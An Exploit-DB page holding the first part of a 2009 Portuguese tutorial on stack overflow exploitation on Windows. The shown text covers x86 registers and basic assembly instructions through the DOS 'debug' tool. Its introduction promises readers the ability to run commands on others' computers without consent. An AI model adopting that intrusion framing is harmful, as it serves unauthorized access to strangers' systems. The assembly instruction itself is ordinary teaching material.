<!DOCTYPE html>
<html lang="en">

<head>
    <script src="/js/core/jquery.min.js"></script>
    <meta charset="utf-8"/>
    <meta name="csrf-token" content="pvujPERn84KoPh5A8ZUpquMsQ7cX9NFpgifmsJnt">

    <link rel="manifest" href="/manifest.json">

    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

    
    <title>[Portuguese] Explorando Stack Overflow no Windows</title>

    <!-- Prism code colouring -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- prism.js syntax highlighter -->
    <script src="/js/clipboard.js"></script>
    <script src="/js/prism.js"></script>

    <link rel="canonical" href="https://www.exploit-db.com/papers/12925">
    <meta name="description" content="[Portuguese] Explorando Stack Overflow no Windows">
    <meta name="keywords" content="Multiple,papers">
    <meta name="author" content="6_Bl4ck9_f0x6">

    <meta property="og:title" content="[Portuguese] Explorando Stack Overflow no Windows">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.exploit-db.com/exploits/12925">
    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
    <meta property="og:site_name" content="Exploit Database" />
    <meta property="article:published_time" content="2009-05-08" />
        <meta property="article:author" content="6_Bl4ck9_f0x6" />
    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=2427" />

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@ExploitDB">
    <meta name="twitter:title" content="[Portuguese] Explorando Stack Overflow no Windows">
    <meta name="twitter:creator" content="@ExploitDB">
    <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">


    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">

    <meta
            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
            name='viewport'/>

    <meta property="og:title" content="Offensive Security&#8217;s Exploit Database Archive">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.exploit-db.com/">

    <meta name="theme-color" content="#ec5e10">

    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
            type="text/javascript">
    </script>

    <script type="text/javascript">
        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );

        ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"
            type="text/javascript">

    </script>

    <!-- Material Design Icons https://materialdesignicons.com/ -->
    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>

    <!-- Theme CSS Files -->
    <link href="/css/bootstrap.min.css" rel="stylesheet"/>

    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>

    <link href="/css/app.css" rel="stylesheet"/>

    <style>
        .rbtn {
            border: 2px solid white;
            border-radius: 20px;
            color: black;
            padding: 8px;
            cursor: pointer;
        }

        .rsuccess {
            border-color: white;
            color: white;
        }

        .rsuccess:hover {
            background-color: white;
            color: #165283;
        }
        .rprimary {
            border-color: #ca4f0c;
            color: #ca4f0c;
        }

        .rprimary:hover {
            background-color: #ca4f0c;
            color: white;
        }
    </style>
</head>

<body class=" sidebar-mini">

<div class="wrapper">

    
    <div class="sidebar" data-color="orange">

    <div class="logo">

        
        <a href="/" class="simple-text logo-mini">
            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
        </a>

        
        
            <a href="/" class="simple-text logo-normal">
                Exploit Database
            </a>

        
    </div>

    <div class="sidebar-wrapper">

        <ul class="nav">

            
            <li class="">

                <a href="/">
                    <i class="mdi mdi-ladybug mdi-24px"></i>
                    <p>Exploits</p>
                </a>

            </li>

            
            <li class="">

                <a href="/google-hacking-database">
                    <i class="mdi mdi-search-web mdi-24px"></i>
                    <p title="Google Hacking Database">GHDB</p>
                </a>

            </li>

            
            <li class="active">

                <a href="/papers">
                    <i class="mdi mdi-file-outline mdi-24px"></i>
                    <p>Papers</p>
                </a>

            </li>

            
            <li class="">

                <a href="/shellcodes">
                    <i class="mdi mdi-chip mdi-24px"></i>
                    <p>Shellcodes</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">



                <li>

                    <a class="nav-link" href="/search">
                        <i class="mdi mdi-database-search mdi-24px"></i>
                        <p title="Search Exploit-Database">Search EDB</p>
                    </a>

                </li>



            <li>

                
                <a class="nav-link" href="/searchsploit">
                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
                    <p>SearchSploit Manual</p>
                </a>

            </li>

            <li>

                
                <a class="nav-link" href="/submit">
                    <i class="mdi mdi-upload mdi-24px"></i>
                    <p>Submissions</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">

            <li>

                <a data-toggle="collapse" href="#onlineTraining" aria-expanded="false">
                    <i class="mdi mdi-school mdi-24px"></i>
                    <p>Online Training <b class="caret"></b></p>
                </a>

                <div class="collapse " id="onlineTraining">
                    <ul class="nav">

                        <li>
                            <a href="/pentest-training-with-kali-linux">
                                <span class="sidebar-mini-icon">PWK</span>
                                <span class="sidebar-normal" title="Penetration Testing with Kali Linux"> PEN-200 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/wireless-attacks-training">
                                <span class="sidebar-mini-icon">WiFu</span>
                                <span class="sidebar-normal" title="Offensive Security Wireless Attacks"> PEN-210 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/evasion-techniques-breaching-defenses">
                                <span class="sidebar-mini-icon">ETBD</span>
                                <span class="sidebar-normal" title="Evasion Techniques and Breaching Defenses"> PEN-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/advanced-web-attacks">
                                <span class="sidebar-mini-icon">AWAE</span>
                                <span class="sidebar-normal" title="Advanced Web Attacks and Exploitation"> WEB-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/windows-user-mode-exploit-development">
                                <span class="sidebar-mini-icon">WUMED</span>
                                <span class="sidebar-normal" title="Windows User Mode Exploit Development"> EXP-301 </span>
                            </a>
                        </li>
                    </ul>

                </div>

            </li>

<!--
            <li>

                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
                    <i class="mdi mdi-link-variant mdi-24px"></i>
                    <p>Offsec Resources</p>
                </a>

            </li>
-->
        </ul>

    </div>

</div>

    <div class="main-panel">

        
        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
  bg-primary">

    <div class="container-fluid">

        <div class="navbar-wrapper">

            <div class="navbar-toggle">
                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
                    <span class="navbar-toggler-bar bar1"></span>
                    <span class="navbar-toggler-bar bar2"></span>
                    <span class="navbar-toggler-bar bar3"></span>
                </button>
            </div>

            
            <a class="navbar-brand" href="/">
                <img src="/images/edb-banner-logo-white.png" height="60" alt="Exploit Database">
            </a>

        </div>

        
        <div class="collapse navbar-collapse justify-content-end" id="navigation">

            <ul class="navbar-nav">

                
                    

                        
                           
                           

                            
                            
                                
                            
                        

                        

                            
                                
                            

                            
                               
                                                     
                                
                            

                            
                                
                            

                        
                    
                

                
                    

                        
                            
                            
                                
                            
                        

                    
                

                <li class="nav-item">

                    
                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">Stats</span>
                        </p>
                    </a>

                </li>

                <li class="nav-item dropdown">

                    
                    <a class="nav-link dropdown-toggle" href="/"
                       id="navbarDropdownMenuLink" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">

                        <i class="mdi mdi-information-outline mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">About Us</span>
                        </p>
                    </a>

                    <div class="dropdown-menu dropdown-menu-right"
                         aria-labelledby="navbarDropdownMenuLink">

                        <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB">
                            About Exploit-DB
                        </a>

                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
                            Exploit-DB History
                        </a>

                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
                            FAQ
                        </a>

                    </div>

                </li>

                
                                    <li class="nav-item">

                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
                            <i class="mdi mdi-database-search mdi-24px"></i>
                            <p>
                                <span class="d-lg-none d-md-block">Search</span>
                            </p>
                        </a>

                    </li>

                
            </ul>

        </div>

    </div>

</nav>

        
        
    <div class="panel-header panel-header-sm"></div>

    <div class="content">

        <div class="row">

            <div class="col-md-12">

                
                <div class="card">

                    <div class="card-body">

                        <div class="row justify-content-md-center">

                            
                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
                                [Portuguese] Explorando Stack Overflow no Windows
                            </h1>

                        </div>

                        
                        <div class="ml-2 mr-2">

                            <div class="row">

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                EDB-ID:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                12925
                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                CVE:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                                                                                        N/A

                                                                
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>EDB Verified:</strong>
                                                <i class="mdi mdi-24px mdi-check"
                                                   style="color: #96b365">
                                                </i>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Author:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?author=2427">
                                                                    6_Bl4ck9_f0x6
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Type:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?type=papers">
                                                                    papers
                                                                </a>

                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>Paper: </strong>
                                                <a href="/download/12925" data-toggle="tooltip" data-placement="top"
                                                   title="Download" aria-label="Download Paper 12925">
                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
                                                </a>
                                                &nbsp; / &nbsp;
                                                <a href="/raw/12925" data-toggle="tooltip" data-placement="top"
                                                   title="View Raw" aria-label="View Raw 12925">
                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
                                                </a>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Platform:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?platform=multiple">
                                                                    Multiple
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Published:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                2009-05-08
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                
                                                <strong>Vulnerable App:</strong>

                                                
                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="row">

                                <div class="btn-group ml-3">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/12924" aria-label="View Previous Paper"
                                       data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
                                    </a>

                                </div>


                                <div class="col">

                                    <div class="btn-group float-right">

                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
                                           href="/papers/12926" aria-label="View Next Paper"
                                           data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
                                        </a>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                
                <div class="card">

                    <div class="card-body">

                        
                        <pre><code class="language-txt" style="white-space: pre-wrap;">                       ============================================            
                       =========== CORPORACAO VIBORA ==============           
                                2006-2008 A.C.H.U.B                   
                           A Cena Hacker Underground Brasileira.            
                       ============================================            
       

       char *titulo[]={
            
       &quot;[=] + =========================[####]========================== + [=]\n&quot;,
       &quot;     *** ----=[ Explorando Stack Overflow no Windows ]=---- ***  \n&quot;,
       &quot;     *** ----=[  PARTE 1 - Entendendo o stack frame  ]=----      \n&quot;,         
       &quot;[=] + =========================[####]========================= + [=]\n\n&quot;};
     
            
&quot;O verdadeiro ator e aquele que nao conhece a si proprio...&quot;
                                       -- 6_Bl4ck9_f0x6


Author  : 6_Bl4ck9_f0x6
A.k.a   : David Diego Dennys F. Siqueira.
e-mail  : b-fox [at] bol [dot] com [dot] br
Milw0rm : http://www.milw0rm.com/author/1863/


About this text:

I wrote this text for to expand knowledge for new  hackers from Brazil and 
of the all world. I hope you like and if you want send me some mails. This  
text also was written as  protest because  exist  many &#039;White Hats&#039; in the
Brazil and they don&#039;t want  to  teach  nothing, to write friend, prove you 
aren&#039;t died and to write! I didn&#039;t see nothing of good in the texts of the 
brazilians, then this text was  writed. Thank&#039;s for to read. Enjoy of this 
text my friend and spit on face of this  stupids white hats. Fuck Security
industry, fuck full disclosure. Good reading...



              [0x01] -  Introducao                      - [0x01]
              [0x02] -  Pre-requisitos                  - [0x02]
              [0x03] -  Um pouco sobre Registers        - [0x03]
              [0x04] -  Instructions set                - [0x04] 
              [0x05] -  GNU debugger - gdb              - [0x05]
              [0x06] -  gcc in-line                     - [0x06]
              [0x07] -  Modos de enderecamento          - [0x07]
              [0x08] -  Funcionamento basico da stack   - [0x08]
              [0x09] -  O stack frame                   - [0x09]
              [0x0A] -  Como acontece o stack overflow  - [0x0A]
              [0x0B] -  Seu primeiro exploit (local)    - [0x0B]
              [0x0C] -  Exploracao remota               - [0x0C]       
              [0x0E] -  Consideracoes finais            - [0x0E]



----- Capitulo 0x01


[=] + =========================================== + [=]
            -----=[  Introducao ]=----- 
[=] + =========================================== + [=]


Com este texto pretendo abordar o funcionamento do stack  frame sobre arquitetura x86 (w32) 
e pretendo mostrar tecnicas de exploracao  do mesmo  tanto local, como remota. Aqui, todo o  
processo sera demonstrado passo a passo, pois todos sabemos a carencia que o  Brasil tem de 
textos em portugues que descrevam tal tecnica &quot;para windows&quot; e  em  uma  linguagem de facil 
&quot;entendimento&quot; para nossos jovens  hackers, que levarao  nossa linhagem  especial  adiante; 
Neste paper voce conhecera o stack frame e tambem sabera como manipula-lo  para faze-lo re-
tornar a um endereco de memoria especifico. No  proximo texto  demonstrarei  manipulacao de 
shellcodes para a exploracao de stack overflows no windows. Tambem escrevi este texto com o 
intuito de aumentar o  arsenal  do milw0rm e  para elevar o prestigio de meu pais aos olhos 
de nossos irmaos hackers do mundo que acessam diariamente o milw0rm, porque  todos  sabemos 
que no Brasil existe uma falta muito grande de  profissionais de qualidade na area  de SI - 
Seguranca da Informacao, e  como se  nao bastasse  o nome do hacking  Brasileiro esta sendo 
sujo a cada dia por alguns Sk&#039;s - Script kiddies que a unica coisa que fazem e usar trojans 
escritos por terceiros e fazer deface por php em sites nunca antes vistos por eles, que por 
sinal sao  muito mau  administrados  pelo  outro  lado da corja, os falsos profissionais de  
seguranca (Nao &quot;hackers&quot;). Gostaria  de fazer um pedido a esses seres imprestaveis:  

&quot;Parem de sujar nosso nome.&quot; 

A &quot;verdadeira&quot; cena hacker do Brasil agradece. Tambem gostaria de dedicar  mais esse texto  
ao str0ke, por estar sempre disposto a abrir portas para a  divulgacao de meu trabalho, ao 
&#039;Edu&#039; que  brevemente fara o que pedi com relacao a area Brasil do blackhat-forums.com ;), 
F3rGO, Dark_Side, blackwinner, e a todas as mulheres do mundo, pois sem elas  nossas vidas 
masculinas totalmente inuteis nao teria sentido  algum. Com o conhecimento  que  aqui sera 
descrito voce aprendera a  executar  comandos em  qualquer computador do mundo,  que esti-
ver conectado a internet, sem o concentimento do proprietario da maquina,  bastando explo-
rar  aplicacoes inseguras  em execucao nas maquinas que serao invadidas, literalmente, por 
&quot;nos&quot;, hackers de sangue puro.



----- Capitulo 0x02


[=] + =========================================== + [=]
           -----=[  Pre-requisitos ]=----- 
[=] + =========================================== + [=]



Como neste texto pretendo abordar passo a passo o processo de exploracao, entao nao se faz 
&quot;necessario&quot; que va procurar  informacoes sobre a  linguagem assembly em  outro texto para
comecar a &quot;entender&quot; como explorar falhas de stack overflow, pois  toda a base se encontra 
neste documento. E claro que voce precisara ter um bom entendimento de assembly para poder 
desenvolver shellcodes, mas por hora a unica coisa  que voce precisara e deste  documento. 
Ao termino da leitura deste .txt  recomendo  que procure algum  curso de assembly para uma 
melhor compreensao do que sera demonstrado aqui, os mecanismos de buscas  atuais sao exce-
lentes. O &#039;real&#039; pre-requisito (Mais que previsivel), sera que o leitor  tenha conhecimen-
tos intermediarios da linguagem C[1], para uma &quot;melhor&quot; compreensao deste  texto. Entendi-
mento de enderecos de memoria e da base de enderecamento hexadecimal[2] tambem  se faz ne-
cessario. As ferramentas necessarias/utilizadas aqui serao o gcc e o gdb. Para obter essas 
ferramentas voce apenas precisa baixar o DEV-C++. Este e sem duvida nenhuma um  dos melho-
res IDE&#039;s do mundo e pode ser encontrado em http://www.bloodshed.net . Os  binarios neces-
sarios se encontram no  diretorio &#039;\Dev-Cpp\bin&#039;, voce  podera inserir uma entrada estati-
ca no PATH do sistema para encontrar este diretorio com o comando PATH=%PATH%;\Dev-Cpp\bin  
inserido em \autoexec.bat .



----- Capitulo 0x03


[=] + =========================================== + [=]
       -----=[  Um pouco sobre Registers  ]=----- 
[=] + =========================================== + [=]

 
Podemos &quot;comparar&quot; um registrador a uma variavel, no qual armazenam  valores diversos. Na
linguagem de programacao assembly existem os registradores de &quot;uso geral&quot; (no  qual podem 
armazenar qualquer valor/dados) e os registradores especiais. Nem todos os  registradores 
podem ser usados para armazenar valores inseridos por nos diretamente, como o registrador 
eip (incluido na classe dos registradores especiais). Cada registrador  possue uma deter-
minada funcao, nos *nixes os registradores de uso geral alem de poderem ser usados para o
armazenamento  de qualquer tipo de dado, possuem funcoes exclusivas  na execucao  de  uma 
syscall por exemplo, como  o  &quot;armazenamento&quot; de valores de retorno das mesmas (eax) caso 
retornem algo, e seus respectivos  argumentos (ebx, ecx, edx, esi e edi respectivamente). 
Veja os registradores de uso geral.



+=====+
| AX  |   Accumulator (Registrador Acumulador)  
+-----+
| BX  |   Base        (Registrador de base )
+-----+ 
| CX  |   Counter     (Registrador Contador)
+-----+
| DX  |   Data        (Registrador de dados)
+=====+


Antes dos processadores 80386 esses registradores eram de 16 bits ( [short] 2 bytes), nos
processadores atuais eles possuem 32 bits ( [long] 4 bytes). Esses registradores sao com-
postos por uma parte alta (&#039;H&#039;igh) e baixa (&#039;L&#039;ow). Nesse caso cada parte  equivale a &#039;8&#039; 
bits. Para uma melhor compreensao por parte do leitor sugiro que abram o debugador nativo 
do windows XP SP1 ou SP2 e outras versoes, me refiro ao propriamente dito: debug.


Microsoft Windows XP [versÃ£o 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\David&gt;debug
-r
AX=0000  BX=0000  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=0100   NV UP EI PL NZ NA PO NC
0D3C:0100 288107CF      SUB     [BX+DI+CF07],AL                    DS:CF07=00
-q


O comando &#039;r&#039; e utilizado para visualizar os valores dos registradores. Note que apesar de
estar em um x86, esses registradores equivalem a 16 bits. Isso se deve ao fato de eu estar
em uma ferramenta ambientada para o antigo MS-DOS, portanto a mesma  continua com seus pa-
droes. Veja o registrador acumulador dividido em sua parte alta e baixa:


AX   =       00             00 
       (High &lt;- Alta)  (Low &lt;- Baixa)


No capitulo  &quot;Instructions Set&quot; veremos como manipular apenas determinas partes de um re-
gistrador. Como disse anteriormente, nos processadores atuais esses registradores equiva-
lem a  32 bits, e para haver uma diferenciacao por parte dos programadores existe uma no-
tacao que e utilizada para referenciar esses registers. Um &#039;E&#039; de Extended. Que em portu-
gues significa &#039;E&#039;stendido. Isso referencia os registradores de 32 bits dos x86 .


==========================
Registradores de uso geral
==========================


+=====+
| EAX |   Extended Accumulator   -&gt; Registrador Acumulador Extendido   
+-----+
| EBX |   Extended Base          -&gt; Registrador de Base Extendido
+-----+ 
| ECX |   Extended Counter       -&gt; Registrador Contador Extendido
+-----+
| EDX |   Extended Data          -&gt; Rigistrador de Dados Extendido
+=====+


Uma representacao ideal para esse registrador em sua parte alta e baixa seria essa:


EAX     =       0000            0000      
           (High &lt;- Alta)  (Low &lt;- Baixa)


Nesse caso cada lado deste registrador e de 16 bits. Somando assim 32 bits (4 bytes).
Acredito que todos saibam que 8 bits equivalem a 1 byte. Veremos  agora  os registra-
dores especiais, os que se  referem ao  stack frame (Descrito &quot;adiante&quot;). Nao citarei
os registradores de segmento.


==========================
 Registradores especiais
==========================


+=====+
| eip |   Instruction pointer   -&gt; Ponteiro de instrucao extendido
+-----+ 
| ebp |   Base pointer          -&gt; Ponteiro de base extendido
+-----+
| esp |   Stack pointer         -&gt; Ponteiro de pilha extendido
+-----+


Esses sao apenas alguns dos registradores especiais (Termo para referenciar os registers
que nao sao de uso geral). O eip aponta para o endereco de memoria da  proxima instrucao 
a ser  executada, o ebp aponta para a base do stack e o esp aponta sempre para o topo da 
stack/pilha. No decorrer do texto voce ficara mais familiarizado com os mesmos.


----- Capitulo 0x04


[=] + =========================================== + [=]
       -----=[  Instructions set  ]=----- 
[=] + =========================================== + [=]


Instruction set, ou &quot;conjunto de instrucoes&quot;, sao as instrucoes que utilizarao os regis-
tradores. Essas instrucoes que sao responsaveis pela copia  de um dado  qualquer para um 
registrador ou dados de um registrador para  o outro, por  exemplo. Demonstrarei  apenas 
algumas instrucoes, ou seja, apenas as que precisaremos para um  &quot;entendimento&quot;  do tema  
abordado neste documento. As instrucoes aceitas por um micro-processador ja sao determi-
nadas de fabrica e voce podera ver as mesmas no site do fabricante (em instruction set).
Veja o instruction set da familia x86 em www.x86.org . No momento apenas se faz necessa-
rio o entendimento das descritas abaixo. Vamos usar mais uma vez o debug do windows, que
sera excelente para um bom entendimento. Usaremos o comando &#039;a&#039; (assemble) para  iniciar 
o processo de marcacao de instrucoes para uma posterior execucao. 


C:\Documents and Settings\David&gt;debug
-a
0D3C:0100


Como voce pode ver, comecaremos a setar nossas instrucoes a partir do endereco 0100, en-
dereco esse que e o reservado como endereco inicial para um  programa MS-DOS de 16 bits. 
A primeira instrucao vista por nos sera a &#039;MOV&#039;, que movimenta (copia) dados. Vamos a um 
exemplo pratico.


--=[ MOV ]=--


(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\David&gt;debug
-a
0D3C:0100 MOV AX,10       ; Copia o numero 10 para a parte baixa de AX (AL)
0D3C:0103 MOV AX,1515     ; Copia 1515 para a parte alta e baixa de AX (15 15).
0D3C:0106 MOV BX,AX       ; Copia AX (1515) para BX (BX = 1515)
0D3C:0108                 ; [Enter]
(...)


Veja os comentarios a sua direita. Bem aqui uma  ressalva deve ser feita. A sintaxe[4]
utilizada acima, foi a INTEL, esta  sintaxe  determina que a origem sempre sera o dado 
da direita, e o destino de tal dado e o registrador da esquerda. A sintaxe AT&amp;T, que e
a utilizada nos *nixes, determina o  oposto, ou seja, na  sintaxe  &#039;AT&amp;T&#039; a origem e o 
valor da esquerda, e o destino e o registrador da direita. O comando -T executa nossas 
instrucoes passao a passo (Step over).


0D3C:0100 MOV AX,10       
(...)
0D3C:0108                 ; [Enter]

-T    
AX=0010  BX=0000  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=0103   NV UP EI PL NZ NA PO NC
0D3C:0103 B81515        MOV     AX,1515


Veja que logo apos a execucao de nossa primeira instrucao, armazenada no endereco de 
memoria 0100, o registrador AX agora possui o valor 10 em sua parte baixa. Repare a-
gora no registrador IP. Veja que ele aponta para a proxima instrucao  a ser executa-
ta, ou seja, a intrucao armazenada no endereco 0103 que e a MOV AX,1515 . Teclamos o
comando &#039;T&#039; mais uma vez e vemos o seguinte resultado: 


-T

AX=1515  BX=0000  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=0106   NV UP EI PL NZ NA PO NC
0D3C:0106 89C3          MOV     BX,AX


Veja que AX agora possui o valor 1515 e o intruction pointer (IP) esta apontando para
o endereco 0106, que e o endereco da proxima instrucao a ser executada (MOV BX,AX).


-T

AX=1515  BX=1515  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=0108   NV UP EI PL NZ NA PO NC
0D3C:0108 2911          SUB     [BX+DI],DX                         DS:1515=2020
-Q

C:\DOCUME~1\David&gt;


Veja que BX agora possui o mesmo valor de AX, ou seja, houve uma copia de dados. O 
comando &#039;Q&#039; (Quit) sai do debug. Ainda podemos manipular somente partes  baixas ou  
altas dos registradores bastando especificarmos o H ou L. Exemplo: MOV AH, 10 .


--=[ CALL e NOP ]=--

A instrucao call (chamar) basicamente faz uma chamada a um endereco de memoria. Veja:


(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\David&gt;debug
-a

0D3C   :  0100 NOP          ; No operation. Instrucao de 1 byte
0D3C   :  0101 NOP
0D3C   :  0102 CALL 0100    ; Chama o endereco 0100
0D3C   :  0105

Seg:     [offset]


Repare que a instrucao NOP (No operation) ou nenhuma operacao, equivale a 1 byte, pois
ela se incia no endereco 0100 e o proximo endereco e o 0101. A instrucao  &#039;NOP&#039; (\x90) 
nao faz nada, quando o processador encontra essa instrucao ele imediatamente pula para
a proxima instrucao. No offset &#039;0102&#039; do segmento de dados (DS = 0D3C)  especifiquei a 
instrucao call seguida do endereco no qual quero &quot;chamar&quot;. Quando executamos a instru-
cao call o fluxo do programa imediatamente segue para o  endereco chamado. A instrucao 
call chama o endereco e as instrucoes que se encontram no endereco chamado  sao execu-
tadas. No capitulo &quot;Funcionamento basico da stack&quot;, veremos mais sobre essa instrucao.
Podemos utilizar instrucoes que movimentam dados especificos, como movl, que movimenta
um long, ou seja, os 4 bytes de um registrador extendido, e movb que movimenta um byte.
Veja mais algumas instrucoes frequentemente usadas para desenvolvimento de shellcodes.


--=[ INC ]=---


Incrementa em 1 o valor de um registrador. 

Sintaxe:

0D3C:0100 INC AX

Logo apos essa intrucao AX (registrador de 16 bits) sera representado dessa forma:

AX=0001

Podemos incrementar tambem apenas lados especificos de cada registrador. Veja mais
exemplos de operacoes manipuladoras de lados altos e baixos:


C:\DOCUME~1\David&gt;debug
-a
0D3C:0100 INC AH
0D3C:0102 INC AL
0D3C:0104          &lt;--- [ENTER]
-t

AX=0100  BX=0000  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=0102   NV UP EI PL NZ NA PO NC
0D3C:0102 FEC0          INC     AL
-t

AX=0101  BX=0000  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=0104   NV UP EI PL NZ NA PO NC
0D3C:0104 2882073C      SUB     [BP+SI+3C07],AL                    SS:3C07=00
-q


--=[ DEC ]=---


A instrucao DEC faz o oposto da instrucao INC. Esta instrucao DECrementa o valor de um
registrador em 1. 

Sintaxe(s):

1 - 0D3C:0100 DEC AX
2 - 0D3C:0100 DEC AH
3 - 0D3C:0100 DEC AL


--=[ ADD ]=--


Essa instrucao &quot;soma&quot; os dados de origem com os dados de detino e o resultado e arma-
zenado no destino.


Exemplo:

-a
0D3C:0100 MOV AX,10        ;   &lt;--- Copia 10 para AX
0D3C:0103 MOV BX,10        ;   &lt;--- Copia 10 para BX
0D3C:0106 ADD AX,BX        ;   &lt;--- Soma AX + BX 
0D3C:0108 


Veja que copio o valor 10 para AX e para BX, depois somo os valores armazenados em ambos 
registradores e o resultado sera armazenado no registrador de destino, AX, pois estou u-
tilizando a sintaxe INTEL. Entao, apos todas  as instrucoes serem  executadas o valor de 
AX sera 20.

(...)

-t

AX=0020  BX=0010  CX=0000  DX=0000  SP=FFEE  BP=0000  SI=0000  DI=0000
DS=0D3C  ES=0D3C  SS=0D3C  CS=0D3C  IP=010A   NV UP EI PL NZ NA PO NC
0D3C:010A 253120        AND     AX,2031
-q

Repare aqui: AX=0020 


--=[ SUB ]=--


A instrucao sub &quot;SUBtrai&quot; dois valores e armazena o resultado no registrador de destino.

Exemplo:

-A
